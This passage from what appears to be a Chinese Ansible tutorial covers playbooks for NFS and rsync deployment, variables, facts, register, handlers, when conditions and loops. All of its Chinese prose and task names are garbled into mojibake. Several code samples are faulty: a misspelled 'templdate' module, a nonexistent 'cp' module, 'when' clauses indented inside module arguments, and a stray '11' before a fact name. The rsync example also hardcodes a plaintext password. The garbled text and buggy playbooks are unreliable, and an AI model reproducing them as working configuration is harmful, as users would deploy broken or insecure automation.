    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-number">02</span> <span class="hljs-string">åˆ†å‘æ–‡ä»¶</span>
      <span class="hljs-attr">copy:</span> 
        <span class="hljs-attr">src:</span> <span class="hljs-string">/etc/hosts</span> 
        <span class="hljs-attr">dest:</span> <span class="hljs-string">/server/files/</span>
</code></pre>
<ul>
<li>æµ‹è¯•å¹¶åˆ†å‘</li>
</ul>
<pre><code class="hljs language-sh" lang="sh">ansible-playbook -C  02.dist_file.yml

<span class="hljs-comment"># -C æµ‹è¯•å‰§æœ¬æ˜¯å¦æœ‰æŠ¥é”™ï¼Œä¸ä¼šçœŸçš„åˆ›å»ºäºåˆ†å‘</span>

ansible-playbook  02.dist_file.yml
</code></pre>
<h6 data-id="heading-54">02 åˆ†å‘è½¯ä»¶åŒ…ï¼Œå®‰è£…è½¯ä»¶åŒ…ï¼Œå¯åŠ¨æœåŠ¡</h6>
<ul>
<li>zabbix-agentè½¯ä»¶åŒ…,åˆ†å‘è½¯ä»¶åŒ…</li>
<li>å®‰è£…è½¯ä»¶åŒ…</li>
<li>å¯åŠ¨å¼€æœºè‡ªå¯åŠ¨</li>
</ul>
<h6 data-id="heading-55">03 nfsæœåŠ¡</h6>
<ul>
<li>
<p>nfsæœåŠ¡ç«¯ï¼šåœ¨backupä¸Šéƒ¨ç½²nfsæœåŠ¡ï¼Œå…±äº«/backup-nfsç›®å½•ï¼Œall_squash,nfsnobody</p>
</li>
<li>
<p>nfså®¢æˆ·ç«¯ï¼šwebæŒ‚è½½ /ans-uploadç›®å½•æŒ‚è½½ nfsæœåŠ¡ç«¯å…±äº«çš„/backup-nfsï¼ˆæ°¸ä¹…æŒ‚è½½ï¼‰</p>
</li>
<li>
<p>æœåŠ¡ç«¯æµç¨‹ï¼š</p>
<ul>
<li>éƒ¨ç½²nfs-utils</li>
<li>ä¿®æ”¹é…ç½®æ–‡ä»¶</li>
<li>åˆ›å»ºå…±äº«ç›®å½•ï¼Œæ”¹æ‰€æœ‰è€…</li>
<li>å¯åŠ¨rpcbindï¼Œnfs</li>
</ul>
</li>
<li>
<p>å®¢æˆ·ç«¯:</p>
<ul>
<li>å®‰è£…nfs-utils</li>
<li>æŒ‚è½½ä¸æ°¸ä¹…æŒ‚è½½</li>
</ul>
</li>
<li>
<p><strong>ç¼–å†™å‰§æœ¬</strong>   vim 04.deploy_nfs.yml</p>
</li>
</ul>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-bullet">-</span> <span class="hljs-attr">hosts:</span> <span class="hljs-string">backup</span>
  <span class="hljs-attr">tasks:</span>
    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-number">01</span><span class="hljs-string">.</span> <span class="hljs-string">éƒ¨ç½²nfs-utils</span>
      <span class="hljs-attr">yum:</span>
        <span class="hljs-attr">name:</span> <span class="hljs-string">nfs-utils,rpcbind</span>
        <span class="hljs-attr">state:</span> <span class="hljs-string">installed</span>
    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-number">02</span><span class="hljs-string">.</span> <span class="hljs-string">ä¿®æ”¹é…ç½®æ–‡ä»¶</span>
      <span class="hljs-comment">#copyå‘é€è¿‡å»</span>
      <span class="hljs-attr">lineinfile:</span>
        <span class="hljs-attr">path:</span> <span class="hljs-string">/etc/exports</span>
        <span class="hljs-attr">line:</span> <span class="hljs-string">"/backup-nfs/ 172.16.1.0/24(rw,all_squash) "</span>
    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-number">03</span><span class="hljs-string">.</span> <span class="hljs-string">å…±äº«ç›®å½•</span>
      <span class="hljs-attr">file:</span>
        <span class="hljs-attr">path:</span> <span class="hljs-string">/backup-nfs/</span>
        <span class="hljs-attr">owner:</span> <span class="hljs-string">nfsnobody</span>
        <span class="hljs-attr">group:</span> <span class="hljs-string">nfsnobody</span>
        <span class="hljs-attr">state:</span> <span class="hljs-string">directory</span>
    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-number">04</span><span class="hljs-string">.</span> <span class="hljs-string">å¯åŠ¨æœåŠ¡rpc</span>
      <span class="hljs-attr">systemd:</span>
        <span class="hljs-attr">name:</span> <span class="hljs-string">rpcbind</span>
        <span class="hljs-attr">enabled:</span> <span class="hljs-literal">yes</span>
        <span class="hljs-attr">state:</span> <span class="hljs-string">started</span>
    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-number">04</span><span class="hljs-string">.</span> <span class="hljs-string">å¯åŠ¨æœåŠ¡nfs</span>
      <span class="hljs-attr">systemd:</span>
        <span class="hljs-attr">name:</span> <span class="hljs-string">nfs</span>
        <span class="hljs-attr">enabled:</span> <span class="hljs-literal">yes</span>
        <span class="hljs-attr">state:</span> <span class="hljs-string">started</span>

<span class="hljs-bullet">-</span> <span class="hljs-attr">hosts:</span> <span class="hljs-string">web</span>
  <span class="hljs-attr">tasks:</span>
    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-number">01</span><span class="hljs-string">.</span> <span class="hljs-string">éƒ¨ç½²æœåŠ¡</span>
      <span class="hljs-attr">yum:</span>
        <span class="hljs-attr">name:</span> <span class="hljs-string">nfs-utils,rpcbind</span>
        <span class="hljs-attr">state:</span> <span class="hljs-string">installed</span>

    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-number">02</span><span class="hljs-string">.</span> <span class="hljs-string">æŒ‚è½½</span>
      <span class="hljs-attr">mount:</span>
        <span class="hljs-attr">src:</span> <span class="hljs-number">172.16</span><span class="hljs-number">.1</span><span class="hljs-number">.41</span><span class="hljs-string">:/backup-nfs/</span>
        <span class="hljs-attr">path:</span> <span class="hljs-string">/ans-upload/</span>
        <span class="hljs-attr">state:</span> <span class="hljs-string">mounted</span>
        <span class="hljs-attr">fstype:</span> <span class="hljs-string">nfs</span>

</code></pre>
<ul>
<li>æµ‹è¯•</li>
</ul>
<pre><code class="hljs language-sh" lang="sh">ansible-playbook  04.deploy_nfs.yml 
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2fc5656c37be4464b1b371323260820f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbGl1eDM1Mjg=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768877500&amp;x-signature=QmsHIz81kdkGPoAmYkOyXa8xogU%3D" alt="image-20230328204825838" loading="lazy"/></p>
<h5 data-id="heading-56">6.4 ansibleä¸­çš„å˜é‡(vars)</h5>
<ul>
<li>å˜é‡æ— å¤„ä¸åœ¨</li>
</ul>

































<table><thead><tr><th>å¯ä»¥å®šä¹‰å˜é‡çš„åœ°æ–¹</th><th/></tr></thead><tbody><tr><td>invertoryä¸»æœºæ¸…å•ä¸­å®šä¹‰å˜é‡</td><td>å¯ä»¥ç”¨äºæ‰¹é‡ä¿®æ”¹ä¸»æœº</td></tr><tr><td>å‘½ä»¤è¡Œä¸­</td><td>å‡ ä¹ä¸ç”¨</td></tr><tr><td>==åœ¨å‰§æœ¬æ–‡ä»¶ä¸­å®šä¹‰==</td><td>æ¯”è¾ƒå¸¸ç”¨</td></tr><tr><td>å˜é‡æ–‡ä»¶ï¼Œ==æ ¹æ®ä¸»æœºæ¸…å•çš„åˆ†ç»„è¿›è¡Œå®šä¹‰å˜é‡==</td><td>å¦‚æœå¤šä¸ªå‰§æœ¬ï¼Œä½¿ç”¨ç›¸åŒçš„å˜é‡</td></tr><tr><td>factså˜é‡</td><td>ä¸€èˆ¬ç”¨æˆ·è·å–ä¸»æœºåŸºæœ¬ä¿¡æ¯ï¼šipï¼Œä¸»æœºåï¼Œç³»ç»Ÿï¼ˆcentos/ubuntuï¼‰<br/>å¦‚æœä¸éœ€è¦å¯ä»¥å…³é—­ï¼Œç”¨äºåŠ é€Ÿå‰§æœ¬çš„æ‰§è¡Œ</td></tr><tr><td>==register å˜é‡ï¼ˆæ³¨å†Œå˜é‡ï¼‰==</td><td>ip=<code>hostname -I</code>  è°ƒç”¨å‘½ä»¤ç»“æœ</td></tr></tbody></table>
<h6 data-id="heading-57">01 åœ¨å‰§æœ¬(playbook)ä¸­å®šä¹‰å˜é‡:arrow_up_small:</h6>
<ul>
<li>æ‰¹é‡åˆ›å»º/liux/test/upload</li>
</ul>
<pre><code class="hljs language-yaml" lang="yaml">[<span class="hljs-string">root@m01</span> <span class="hljs-string">playbook</span>]<span class="hljs-comment"># cat 05.vars.yml </span>
<span class="hljs-bullet">-</span> <span class="hljs-attr">hosts:</span> <span class="hljs-string">all</span>
  <span class="hljs-attr">vars:</span>
    <span class="hljs-attr">dir:</span> <span class="hljs-string">/liux/test/upload</span>
  <span class="hljs-attr">tasks:</span>
    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">mkdir</span>
      <span class="hljs-attr">file:</span>
        <span class="hljs-attr">path:</span> <span class="hljs-string">"<span class="hljs-template-variable">{{ dir }}</span>"</span>
        <span class="hljs-attr">state:</span> <span class="hljs-string">directory</span>

</code></pre>
<blockquote>
<p>æ¸©é¦¨æç¤ºï¼šå¦‚æœå˜é‡æ˜¯æŸä¸ªé€‰é¡¹çš„å¼€å¤´ï¼Œåˆ™å˜é‡å¼•ç”¨çš„æ—¶å€™éœ€è¦åŠ ä¸ŠåŒå¼•å·ã€‚</p>
<p>path: "{{ dir }}"</p>
<p>path: /app/{{ dir }}   è¿™ç§å¯ä»¥ä¸åŠ </p>
</blockquote>
<h6 data-id="heading-58">02 å…±ç”¨å˜é‡-å˜é‡æ–‡ä»¶:star::star::star:</h6>
<pre><code class="hljs language-sh" lang="sh">[root@m01 /server/scripts/playbook]<span class="hljs-comment"># cat 05.vars.yml</span>
- hosts: all
vars_files: ./vars.yml
tasks:
- name: file
file:
path: <span class="hljs-string">"{{ dir }}/{{ user }}-{{ file }}"</span>
state: <span class="hljs-built_in">touch</span>

[root@m01 /server/scripts/playbook]<span class="hljs-comment"># cat vars.yml</span>
<span class="hljs-built_in">dir</span>: /tmp/
file: lidao.txt
user: lidao996kkk
</code></pre>
<h6 data-id="heading-59">03 ä¸»æœºç»„åˆ›å»ºå˜é‡æ–‡ä»¶ (å®˜æ–¹æ¨è)</h6>
<ul>
<li>group_vars</li>
</ul>
<pre><code class="hljs language-sh" lang="sh">group_vars/
lb/vars.yml <span class="hljs-comment">#å­˜æ”¾lbç»„çš„å˜é‡</span>
web/vars.yml <span class="hljs-comment">#å­˜æ”¾webç»„çš„å˜é‡</span>
data/vars.yml <span class="hljs-comment">#å­˜æ”¾xxxç»„çš„å˜é‡</span>
all/vars.yml <span class="hljs-comment">#æ‰€æœ‰ä¸»æœºå…±ç”¨çš„å˜é‡</span>
</code></pre>
<ul>
<li>åˆ›å»ºå±äºliuxç”¨æˆ·çš„æ–‡ä»¶</li>
</ul>
<pre><code class="hljs language-sh" lang="sh">[root@m01 /server/scripts/playbook]<span class="hljs-comment"># cat 05.vars.yml</span>
- hosts: all
  tasks:
    - name: file
      file:
        path: <span class="hljs-string">"{{ dir }}/{{ user }}-{{ file }}"</span>
        owner: <span class="hljs-string">"{{ user }}"</span>
        group: <span class="hljs-string">"{{ user }}"</span>
        state: <span class="hljs-built_in">touch</span>


[root@m01 /server/scripts/playbook]<span class="hljs-comment"># tree -F</span>
â”œâ”€â”€ 05.vars.yml
â””â”€â”€ group_vars/
      â””â”€â”€ all/
        â””â”€â”€ vars.yml



[root@m01 /server/scripts/playbook]<span class="hljs-comment"># cat  group_vars/all/vars.yml</span>
<span class="hljs-built_in">dir</span>: /opt/
file: liux.txt
user: liux
</code></pre>
<blockquote>
<p>âš æ¸©é¦¨æç¤º: group_varsåº”ç”¨æç¤º</p>
<p>â€‹                       ä¸€èˆ¬ä½¿ç”¨group_varsä¸­çš„allåˆ†ç»„å³å¯</p>
</blockquote>
<h6 data-id="heading-60">04 factså˜é‡</h6>
<blockquote>
<p>Ansible factsæ˜¯åœ¨è¢«ç®¡ç†è¿½å‡»ä¸Šé€šè¿‡Ansibleè‡ªåŠ¨é‡‡é›†å‘ç°çš„å˜é‡ã€‚<code>facts</code>åŒ…å«æ¯å°ç‰¹å®šçš„ä¸»æœºä¿¡æ¯ã€‚æ¯”å¦‚ï¼šè¢«æ§ç«¯çš„ä¸»æœºåã€IPåœ°å€ã€ç³»ç»Ÿç‰ˆæœ¬ã€CPUæ•°é‡ã€å†…å­˜çŠ¶æ€ã€ç£ç›˜çŠ¶æ€ç­‰ç­‰</p>
</blockquote>
<ul>
<li>
<p>è¿è¡Œå‰§æœ¬çš„æ—¶å€™ansä¼šæ”¶é›†æ¯ä¸ªä¸»æœºçš„åŸºæœ¬ä¿¡æ¯,è¿™äº›ä¿¡æ¯å½¢æˆçš„å˜é‡å«åšfactså˜é‡.</p>
</li>
<li>
<p>factså˜é‡setupæ¨¡å—è·å–</p>
</li>
</ul>
<pre><code class="hljs language-sh" lang="sh">å¸¸ç”¨factå˜é‡
 ansible_hostname <span class="hljs-comment">#ä¸»æœºå</span>
 ansible_memtotal_mb <span class="hljs-comment">#å†…å­˜å¤§å°(æ€»è®¡) å•ä½mb</span>
 ansible_processor_vcpus <span class="hljs-comment">#cpuæ•°é‡</span>

 ansible_default_ipv4.address <span class="hljs-comment">#é»˜è®¤çš„ç½‘å¡ip eth0</span>
 ansible_distribution <span class="hljs-comment">#ç³»ç»Ÿå‘è¡Œç‰ˆæœ¬åå­— CentOS Ubuntu </span>

 ansible_processor_vcpus
 ansible_processor_core
11 ansible_date_time.date
</code></pre>
<ul>
<li>æ‰¹é‡ä¿®æ”¹ç³»ç»Ÿ/etc/motdæ–‡ä»¶,ç™»å½•çš„æ—¶å€™è¾“å‡ºç³»ç»Ÿçš„åŸºæœ¬ä¿¡æ¯.</li>
</ul>
<p>â€‹           è¾“å‡ºä¸»æœºå</p>
<p>â€‹           è¾“å‡ºå†…å­˜æ€»å¤§å°</p>
<p>â€‹		   è¾“å‡ºipåœ°å€</p>
<p>â€‹           å‘è¡Œç‰ˆæœ¬</p>
<p>â€‹           cpuæ•°</p>
<p>â€‹           æ ¸å¿ƒæ•°</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment">#1. åˆ›å»ºåŒ…å«å˜é‡çš„æ¨¡æ¿æ–‡ä»¶</span>
<span class="hljs-comment">#2. å‘é€æ¨¡æ¿æ–‡ä»¶æ›¿ä»£/etc/motd å³å¯</span>
[<span class="hljs-string">root@m01</span> <span class="hljs-string">/server/scripts/playbook</span>]<span class="hljs-comment"># cat 07.change_motd.yml</span>
<span class="hljs-bullet">-</span> <span class="hljs-attr">hosts:</span> <span class="hljs-string">all</span>
  <span class="hljs-attr">tasks:</span>
    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">åˆ†å‘motdæ–‡ä»¶</span>
      <span class="hljs-attr">templdate:</span>
        <span class="hljs-attr">src:</span> <span class="hljs-string">templates/motd.j2</span>
        <span class="hljs-attr">dest:</span> <span class="hljs-string">/etc/motd</span>
        <span class="hljs-attr">backup:</span> <span class="hljs-literal">yes</span>
    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">åˆ†å‘motdæ–‡ä»¶</span>
      <span class="hljs-attr">cp:</span>
        <span class="hljs-attr">src:</span> <span class="hljs-string">templates/motd.j2</span>
        <span class="hljs-attr">dest:</span> <span class="hljs-string">/tmp/motd</span>
        <span class="hljs-attr">backup:</span> <span class="hljs-literal">yes</span>
        
        


[<span class="hljs-string">root@m01</span> <span class="hljs-string">/server/scripts/playbook</span>]<span class="hljs-comment"># cat templates/motd.j2</span>
<span class="hljs-comment">#######################################</span>
<span class="hljs-string">welcome</span> <span class="hljs-string">to</span> <span class="hljs-string">oldboy</span> <span class="hljs-string">elastic</span> <span class="hljs-string">linux</span> <span class="hljs-string">system</span>
<span class="hljs-string">æ“ä½œéœ€è°¨æ…,åˆ æ ¹å¼¹æŒ‡é—´.</span>
<span class="hljs-string">ä¸»æœºå:</span> {{ <span class="hljs-string">ansible_hostname</span> }}
<span class="hljs-string">ipåœ°å€:</span> {{ <span class="hljs-string">ansible_default_ipv4.address</span> }}
<span class="hljs-string">å†…å­˜å¤§å°:</span> {{ <span class="hljs-string">ansible_memtotal_mb</span> }}
<span class="hljs-string">CPUæ•°é‡:</span> {{ <span class="hljs-string">ansible_processor_vcpus</span> }}
<span class="hljs-string">æ ¸å¿ƒæ€»æ•°:</span> {{ <span class="hljs-string">ansible_processor_cores</span> }}
<span class="hljs-string">å‘è¡Œç‰ˆæœ¬:</span> {{ <span class="hljs-string">ansible_distribution</span> }}
</code></pre>
<blockquote>
<p>æ¸©é¦¨æç¤º: template vs copyæ¨¡å—</p>
<p>â€‹				copyä»…ä»…ä¼ è¾“æ•°æ®,å¤åˆ¶æ–‡ä»¶.</p>
<p>â€‹				template ä¼ è¾“æ•°æ®,å¤åˆ¶æ–‡ä»¶çš„æ—¶å€™,æ–‡ä»¶ä¸­çš„å˜é‡ä¼šè¢«è§£æå’Œè¿è¡Œ.</p>
</blockquote>
<blockquote>
<p>å…³äºfactså˜é‡å®é™…åº”ç”¨æ¡ˆä¾‹:</p>
<ol>
<li>
<p>é€šè¿‡factså˜é‡è·å–ç³»ç»Ÿçš„åŸºæœ¬ä¿¡æ¯</p>
</li>
<li>
<p>é€šè¿‡factså˜é‡è·å–ä¿¡æ¯å¹¶è¿›è¡Œåˆ¤æ–­</p>
</li>
<li>
<p>å¦‚æœä¸éœ€è¦å¯ä»¥è¿›è¡Œå…³é—­,åŠ é€Ÿå‰§æœ¬çš„è¿è¡Œ( gather_facts: no)</p>
</li>
</ol>
</blockquote>
<ul>
<li>å…³é—­facts</li>
</ul>
<pre><code class="hljs language-sh" lang="sh">[root@m01 ~]<span class="hljs-comment"># vim facts.yml</span>
- hosts: web_group
  gather_facts: no <span class="hljs-comment">#å…³é—­ä¿¡æ¯é‡‡é›†</span>
  tasks:
</code></pre>
<h6 data-id="heading-61">05 registerå˜é‡</h6>
<ul>
<li>
<p>æœ¬è´¨ä¸Šå°±æ˜¯ç”¨æ¥å®ç°è„šæœ¬ä¸­çš„<code>åå¼•å·åŠŸèƒ½. ip=\hostname -I</code></p>
</li>
<li>
<p>ç”¨æˆ·é€šè¿‡å‘½ä»¤è·å–çš„å†…å®¹éƒ½å­˜æ”¾åˆ°Registerå˜é‡ä¸­.</p>
</li>
</ul>
<pre><code class="hljs language-sh" lang="sh">[root@m01 /server/scripts/playbook]<span class="hljs-comment"># cat 08.reg-vars.yml</span>
- hosts: all
  gather_facts: no
  tasks:
    - name: get <span class="hljs-built_in">date</span>
      shell: <span class="hljs-built_in">date</span> +%F
      register: result

    - name: <span class="hljs-built_in">print</span> result å˜é‡å†…å®¹
      debug:
        msg: |
              <span class="hljs-string">"registerå˜é‡çš„å…¨éƒ¨å†…å®¹æ˜¯:{{ result.stderr }}"</span>
               <span class="hljs-string">"registerå˜é‡çš„ç²¾ç¡®çš„å†…å®¹æ˜¯:{{ result.stdout}}"</span>
</code></pre>
<blockquote>
<p>registeræ³¨å†Œå˜é‡:
å˜é‡.stdout è·å–è¾“å‡ºå³å¯</p>
<p>ç¬¦å·è¯´æ˜:
msg:ä¸­çš„|è¡¨ç¤ºä¸‹é¢çš„å†…å®¹æ˜¯å¤šè¡Œ. |ä¹Ÿå¯ä»¥ç”¨äºå…¶ä»–æ¨¡å—ä¸­.</p>
</blockquote>
<ul>
<li>æŸä¸ªRegisterå˜é‡çš„ä¿¡æ¯</li>
</ul>
<pre><code class="hljs language-sh" lang="sh">{
 <span class="hljs-string">'stderr_lines'</span>: [],
 u<span class="hljs-string">'changed'</span>: True,
 u<span class="hljs-string">'end'</span>: u<span class="hljs-string">'2022-08-24 16:38:27.887829'</span>,
 <span class="hljs-string">'failed'</span>: False,
 u<span class="hljs-string">'stdout'</span>: u<span class="hljs-string">'2022-08-24'</span>,
 u<span class="hljs-string">'cmd'</span>: u<span class="hljs-string">'date +%F'</span>,
 u<span class="hljs-string">'rc'</span>: 0,
 u<span class="hljs-string">'start'</span>: u<span class="hljs-string">'2022-08-24 16:38:27.860574'</span>,
 u<span class="hljs-string">'stderr'</span>: u<span class="hljs-string">''</span>,
 u<span class="hljs-string">'delta'</span>: u<span class="hljs-string">'0:00:00.027255'</span>,
 <span class="hljs-string">'stdout_lines'</span>: [u<span class="hljs-string">'2022-08-24'</span>],
 <span class="hljs-string">'ansible_facts'</span>: {u<span class="hljs-string">'discovered_interpreter_python'</span>:u<span class="hljs-string">'/usr/bin/python'</span>}
</code></pre>
<h5 data-id="heading-62">6.5 playbooké‡æ„rsync</h5>
<pre><code class="hljs language-sh" lang="sh">æ‰‹åŠ¨éƒ¨ç½²rsyncæœåŠ¡:
1.å®‰è£…rsync
2.é…ç½®rsync(é…ç½®æ–‡ä»¶æå‰æ”¶é›†)
3.åˆ›å»ºå¿…è¦æ•°æ®
  åˆ›å»ºç”¨æˆ·
  åˆ›å»ºå¯†ç æ–‡ä»¶ æƒé™
  åˆ›å»ºç›®å½• ä¿®æ”¹æƒé™
4.å¯åŠ¨

[root@m01 /server/scripts/playbook]<span class="hljs-comment"># cat rsync.yml </span>
- hosts: backup
  tasks:
    - name: Install Rsync Server
      yum:
        name: rsync
        state: present
    - name: configure rsync server
      copy:
        src: rsyncd.conf
        dest: /etc/rsyncd.conf
    - name: create group www
      group:
        name: www
        gid: 666
    - name: create user www
      user:
        name: www
        uid: 666
        group: www
        shell: /sbin/nologin
        create_home: <span class="hljs-literal">false</span>
    - name: create passwd file
      copy:
        content: rsync_backup:12366
        dest: /etc/rsync.passwd
        mode: 0600
    - name: create backup <span class="hljs-built_in">dir</span>
      file:
        path: /backup
        state: directory
        owner: www
        group: www
    - name: start rsync server
      systemd:
        name: rsyncd
        state: started
        enabled: <span class="hljs-built_in">yes</span>

<span class="hljs-comment">#è¯­æ³•æ£€æŸ¥</span>
[root@m01 /server/scripts/playbook]<span class="hljs-comment"># ansible-playbook --syntax-check rsync.yml</span>
<span class="hljs-comment">#æ¨¡æ‹Ÿè¿è¡Œ</span>
[root@m01 /server/scripts/playbook]<span class="hljs-comment"># ansible-playbook -C  rsync.yml</span>
<span class="hljs-comment">#è¿è¡Œ</span>
[root@m01 /server/scripts/playbook]<span class="hljs-comment"># ansible-playbook  rsync.yml</span>
</code></pre>
<h5 data-id="heading-63">6.5 playbooké‡æ„nfs</h5>
<pre><code class="hljs language-sh" lang="sh">æ‰‹åŠ¨é…ç½®nfs
1.å®‰è£…nfs
  yum -y install nfs-utils
2.é…ç½®nfs
  exports(æå‰å‡†å¤‡)
3.åˆ›å»ºå¿…è¦æ•°æ®ä¿¡æ¯
  åˆ›å»ºwwwç”¨æˆ·
  åˆ›å»ºå…±äº«ç›®å½•/data/blog ä¿®æ”¹å±ä¸»å±ç»„
4.å¯åŠ¨nfs

[root@m01 /server/scripts/playbook]<span class="hljs-comment"># cat nfs.yml </span>
- hosts: nfs
  tasks:
    - name: install nfs-utils server
      yum:
        name: nfs-utils
        state: present
    - name: configure nfs server
      copy:
        src: exports
        dest: /etc/exports
    - name: create group www
      group:
        name: www
        gid: 666
    - name: create user www
      user:
        name: www
        uid: 666
        group: www
        shell: /sbin/nologin
        create_home: <span class="hljs-literal">false</span>
    - name: create /code/blog <span class="hljs-built_in">dir</span>
      file:
        path: /code/blog
        state: directory
        owner: www
        group: www
    - name: start nfs server
      systemd:
        name: nfs
        state: started
        enabled: <span class="hljs-built_in">yes</span>

</code></pre>
<h4 data-id="heading-64">7.Ansible-è¿›é˜¶-æµç¨‹æ§åˆ¶</h4>
<h5 data-id="heading-65">7.1æµç¨‹æ§åˆ¶</h5>
<ul>
<li>handler</li>
<li>when</li>
<li>loop/with_item</li>
</ul>
<h6 data-id="heading-66">01 handlerè§¦å‘å™¨</h6>
<ul>
<li>
<p>ä¿®å¤æœåŠ¡çš„é…ç½®æ–‡ä»¶ä¹‹åï¼Œé‡å¯æœåŠ¡ã€‚</p>
</li>
<li>
<p>æœ‰æ—¶å€™é…ç½®æ–‡ä»¶æ²¡æœ‰å˜åŒ–çš„æ—¶å€™ï¼Œåˆ™ä¸éœ€è¦é‡å¯æœåŠ¡ï¼Œä»…ä»…é…ç½®æ–‡ä»¶å˜åŒ–æ‰éœ€è¦é‡å¯æœåŠ¡ã€‚</p>
</li>
<li>
<p>æ²¡æœ‰ä½¿ç”¨notifyå’Œhandlerè§¦å‘å™¨</p>
</li>
</ul>
<pre><code class="hljs language-sh" lang="sh">[root@m01 playbook]<span class="hljs-comment"># cat 09.ans_handler.yml </span>
- hosts: backup
  gather_facts: no
  tasks:
    - name: åˆ†å‘é…ç½®æ–‡ä»¶
      copy:
        src: files/exports
        dest: /etc/exports
        backup: <span class="hljs-built_in">yes</span>
    - name: é‡å¯æœåŠ¡
      systemd:
        name: nfs
        state: reloaded
</code></pre>
<blockquote>
<p>å¦‚ä¸Šä»£ç ï¼Œä¸ç®¡åˆ†å‘çš„é…ç½®æ–‡ä»¶å‘ç”Ÿå˜åŒ–ä¸å¦ï¼Œéƒ½ä¼šé‡å¯æœåŠ¡</p>
</blockquote>
<ul>
<li>ä½¿ç”¨notifyå’Œhandler</li>
</ul>
<pre><code class="hljs language-sh" lang="sh">[root@m01 playbook]<span class="hljs-comment"># cat 09.ans-user-handler.yml </span>
- hosts: backup
  gather_facts: no
  tasks:
    - name: åˆ†å‘é…ç½®æ–‡ä»¶
      copy:
        src: files/exports
        dest: /etc/exports
        backup: <span class="hljs-built_in">yes</span>
      notify:
        - é‡å¯æœåŠ¡
 
  handlers:
    - name: é‡å¯æœåŠ¡
      systemd:
        name: nfs
        state: reloaded
</code></pre>
<blockquote>
<p>åªæœ‰å½“åˆ†å‘çš„é…ç½®æ–‡ä»¶å‘ç”Ÿå˜åŒ–ï¼Œnotifyä¼šæ ¹æ® â€œé‡å¯æœåŠ¡â€ å»handlersæŸ¥æ‰¾ï¼Œç„¶åé‡å¯æœåŠ¡</p>
</blockquote>
<h6 data-id="heading-67">02 whenåˆ¤æ–­</h6>
<ul>
<li>whenè¿›è¡Œåˆ¤æ–­ï¼Œä¸€èˆ¬ä¸å˜é‡ä¸€èµ·ä½¿ç”¨ã€‚</li>
<li>ä¸€èˆ¬factså˜é‡æˆ–è€…registerå˜é‡è¾ƒå¤šã€‚</li>
</ul>
<pre><code class="hljs language-sh" lang="sh">[root@m01 playbook]<span class="hljs-comment"># vim 10.when.yml</span>

- hosts: all
  tasks:
    - name: åªæœ‰è¾“å‡ºä¿¡æ¯
      debug:
        msg: <span class="hljs-string">"è¿™æ˜¯{{ansible_hostname}},æ­£åœ¨å®‰è£…è½¯ä»¶......"</span>
      when: ansible_hostname == <span class="hljs-string">"backup"</span>
</code></pre>
<blockquote>
<p>whenä¸­ä½¿ç”¨çš„ç¬¦å·ï¼š</p>
<p>â€‹		==  ç­‰äº</p>
<p>â€‹		is match(web)</p>
<p>â€‹		ansible_hostname is match("web|backup")
â€‹        ansible_hostname is not match("web|backup")</p>
</blockquote>
<ul>
<li>æ¡ˆä¾‹: å¦‚æœç³»ç»Ÿæ˜¯centosåˆ™ å®‰è£…sl,cowsay,å¦‚æœæ˜¯ubuntu åˆ™å®‰è£…cmatrix</li>
</ul>
<pre><code class="hljs language-sh" lang="sh">[root@m01 /server/scripts/playbook]<span class="hljs-comment"># cat 11.when-sys.yml</span>
- hosts: all
  tasks:
    - name: yum sl,cowsay
      yum:
        name: sl,cowsay
        state: installed
        when: ansible_distribution == <span class="hljs-string">"CentOS"</span>
 
    - name: apt cmatrix
      apt:
        name: cmatrix
        state: present
        when: ansible_distribution == <span class="hljs-string">"Ubuntu"</span>
        
<span class="hljs-comment">#and</span>
 when: ( ansible_distribution == <span class="hljs-string">"CentOS"</span> and ansible_hostname == <span class="hljs-string">"web01"</span> )
 æˆ–è€…
  when: 
        - ansible_distribution == <span class="hljs-string">"CentOS"</span>	  <span class="hljs-comment"># åˆ¤æ–­ç‰ˆæœ¬ä¸ºcentos</span>
        - ansible_hostname == <span class="hljs-string">"web01"</span>		  <span class="hljs-comment"># åˆ¤æ–­ä¸»æœºåç§°ä¸ºweb01</span>
</code></pre>
<ul>
<li>é€šè¿‡nginxè¿”å›ç»“æœæ¥åˆ¤æ–­æ˜¯å¦è®©nginxé‡å¯</li>
</ul>
<pre><code class="hljs language-sh" lang="sh">[root@ansible ansible]<span class="hljs-comment"># cat when.yml </span>
- hosts: web01
  tasks:
    - name: Configure Nginx file
      copy:
        src: nginx.conf
        dest: /etc/nginx/nginx.conf

    - name: <span class="hljs-built_in">test</span> nginx file
      shell: <span class="hljs-string">'nginx -t'</span>
      ignore_errors: <span class="hljs-built_in">yes</span>
      register: ngx_re

    - name: <span class="hljs-built_in">print</span> ngx_re    <span class="hljs-comment"># è°ƒè¯•å®Œæˆåå¯ä»¥å–æ¶ˆdebugè¾“å‡º</span>
      debug:
        msg: <span class="hljs-string">"{{ ngx_re.stderr_lines }}"</span>

    - name: Restart Nginx Server
      systemd:
        name: nginx
        state: restarted
      when: ngx_re.stderr_lines is search <span class="hljs-string">"ok"</span>
</code></pre>
<h6 data-id="heading-68">03 å¾ªç¯</h6>
<ul>
<li>with_items</li>
<li>loop</li>
</ul>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-comment">#æ‰¹é‡å¾ªç¯å¯åŠ¨rpcbindå’ŒnfsæœåŠ¡   </span>
[root@m01 playbook]<span class="hljs-comment"># cat 12.loop.yml</span>
- hosts: backup
  gather_facts: <span class="hljs-literal">false</span>
  tasks:
    - name: é‡å¯æœåŠ¡
      systemd:
